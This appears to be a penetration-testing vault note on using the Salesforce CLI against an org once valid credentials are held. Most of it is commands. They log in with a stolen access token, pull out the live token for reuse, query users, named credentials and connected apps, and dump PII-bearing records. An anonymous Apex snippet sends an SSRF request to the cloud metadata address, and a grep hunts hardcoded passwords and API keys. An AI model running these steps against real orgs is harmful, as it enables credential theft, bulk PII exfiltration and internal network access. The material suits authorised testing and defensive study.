# salesforce-cli

**Tags:** #Salesforce #CRM #SaaS #cloud #SOQL #enumeration

The official Salesforce command-line tool (`sf`, formerly `sfdx`). It authenticates to an org (interactive web login, JWT, or an access token) and drives the REST/Tooling/Metadata APIs — running SOQL queries, describing objects, executing anonymous Apex, and pulling metadata. On an engagement it's the fastest authenticated client once you hold valid credentials or a token, replacing hand-built curl calls against `/services/data/`.

**Source:** https://developer.salesforce.com/tools/salesforcecli
**Install:** `npm install -g @salesforce/cli`

```bash
# --- Authenticate ---
sf org login web --instance-url https://<instance>.my.salesforce.com    # interactive
sf org login access-token --instance-url https://<instance>.my.salesforce.com  # paste a stolen token
sf org list                                                             # connected orgs/aliases
```

### Extract the Access Token (reuse elsewhere)

```bash
# --verbose reveals the live Access Token + Instance URL — feed to curl/Burp/other tools
sf org display --verbose --target-org <alias>
# then, e.g.:  curl -H "Authorization: Bearer <token>" https://<instance>/services/data/v60.0/sobjects/
```

### Enumerate & Loot via SOQL

```bash
sf data query --query "SELECT Id,Name,Email,ProfileId FROM User" --target-org <alias>
sf data query --query "SELECT Id,DeveloperName,Endpoint FROM NamedCredential" --target-org <alias>   # integration endpoints
sf data query --query "SELECT Name,Value FROM ConnectedApplication" --target-org <alias>
sf sobject list --target-org <alias>                                    # all objects (find custom __c ones)
sf sobject describe --sobject Account --target-org <alias>              # fields on a sensitive object
# then dump PII-bearing objects: Account, Contact, Case, and custom __c objects
```

### Anonymous Apex — code exec inside the org (SSRF / data access)

```bash
sf apex run --file exploit.apex --target-org <alias>
# exploit.apex can make HTTP callouts (SSRF to internal/metadata) and read any data the
# running user can see, e.g.:
#   HttpRequest r = new HttpRequest(); r.setEndpoint('http://169.254.169.254/latest/meta-data/');
#   r.setMethod('GET'); System.debug(new Http().send(r).getBody());
```

### Pull Metadata (hardcoded secrets in Apex)

```bash
# Apex source, triggers, etc. often contain hardcoded API keys / creds
sf project retrieve start --metadata ApexClass --target-org <alias>
grep -riE 'password|api[_-]?key|secret|token' force-app/

> [!note] **See also**
> Services this tool is used against in this vault: [[Services/Cloud & Data/Salesforce|Salesforce]] — authenticated SOQL/Tooling enumeration.
> Related tooling: [[Tools/Scanning/nuclei|nuclei]] (org fingerprinting), [[Tools/Web/Burpsuite|Burp Suite]] (manual Aura testing), [[Tools/File Transfer/cURL|cURL]] (raw REST).

---

*Created: 2026-09-22*
*Updated: 2026-09-28*
*Model: claude-opus-4-8*
